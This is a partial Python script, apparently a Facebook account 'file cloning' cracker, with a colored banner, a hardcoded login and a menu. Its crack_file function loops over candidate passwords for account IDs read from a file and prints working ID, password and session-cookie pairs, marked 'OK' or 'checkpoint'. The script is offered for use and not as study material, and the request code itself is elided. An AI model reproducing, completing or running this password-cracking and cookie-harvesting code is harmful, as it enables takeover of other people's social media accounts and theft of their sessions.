...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mYUBI')
...
while attemps < 12345677901:
    ...
    if username == 'PRABESH' and password == 'FIRE':
...
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
__________              ___.                 .__     
\______   \____________ \_ |__   ____   _____|  |__  
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • FACEBOOK= PRABESH HERO
\033[0;92m • GITHUB= PRABESH -EXE 
\033[0;92m •   ONLY FILE CLONING 
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
	PRABESHj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	PRABESHj('\033[0;97m===============================================')
	PRABESH= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if PRABESH in ['m']:
		public()
	elif PRABESH in ['1']:
		crack_file()
	elif PRABESH in ['i','0i']:
		result()
	elif PRABESH in ['2','02']:
		os.system('xdg-open https://fb.me/100074788749098')
	elif PRABESH in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/YUBI.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#PRABESH-KING
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•YUBI-Cp] {idf} • {pw}\n\033[0;93[🍪]= COOKIES• \033[0;92m{kuki} ')     
				...
				#PRABESH-KING
				print(f'\r\033[0;92m[YUBI-➼-OK🔥] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " PRABESH,  Ok,  id"')
